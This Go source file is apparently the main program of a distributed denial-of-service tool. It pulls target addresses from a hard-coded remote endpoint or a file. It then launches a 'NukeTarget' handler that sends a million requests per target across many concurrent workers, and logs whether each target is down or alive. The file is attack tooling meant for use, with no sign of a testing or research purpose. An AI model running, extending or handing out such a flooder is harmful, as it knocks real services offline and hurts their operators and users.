package main

import (
	"context"
	"flag"
	"log"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	logw "github.com/andriiyaremenko/logwriter"
	"github.com/andriiyaremenko/mg/client"
	"github.com/andriiyaremenko/mg/handler"
	"github.com/andriiyaremenko/mg/source"
	"github.com/andriiyaremenko/tinycqs/command"
)

func main() {
	t := flag.String("t", "endpoint", "source type to use (file or endpoint)")
	s := flag.String("s", "https://api.itemstolist.top/api/target", "url to endpoint or file name")
	q := flag.Int("q", 2, "log verbosity level")
	workersPerCore := flag.Int("w", 10, "number of workers per logical CPU")
	amountRequests := flag.Int64("n", 1000000, "number of requests per each target")

	ctx := context.Background()
	ctx, cancel := context.WithCancel(ctx)
	log := log.New(
		logw.LogWriter(ctx, os.Stdout, logw.Option(*q, logw.JSONFormatter, time.RFC3339)),
		"",
		log.Lmsgprefix,
	)

	flag.Parse()

	numWorkers := *workersPerCore * runtime.NumCPU()

	var readSource command.Handler
	switch *t {
	case "file":
		readSource = handler.ReadSource(source.GetFromFile(*s), numWorkers)
		log.Printf("reading from file %s", *s)
	case "endpoint":
		readSource = handler.ReadSource(source.GetFromEndpoint(client.New(), *s), numWorkers)
		log.Printf("reading from endpoint %s", *s)
	default:
		log.Fatalln(logw.Error.WithMessage("source type %s is unsupported", *t))
	}

	comm, err := command.NewWithConcurrencyLimit(
		numWorkers,
		readSource,
		handler.NukeTarget(*amountRequests),
		handler.TargetDown(log),
		handler.TargetAlive(log),
		handler.TargetError(log),
		handler.HandleErrors(log),
	)

	if err != nil {
		log.Fatalln(logw.Error, err)
	}

	c := make(chan os.Signal, 1)

	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c

		cancel()

		log.Println("shutting down...")
		os.Exit(1)
	}()

	ev := comm.Handle(ctx, command.E{Type: "READ_SOURCE"})

	if err := ev.Err(); err != nil {
		log.Fatalln(logw.Error, err)
	}

	log.Println(string(ev.Payload()))
}
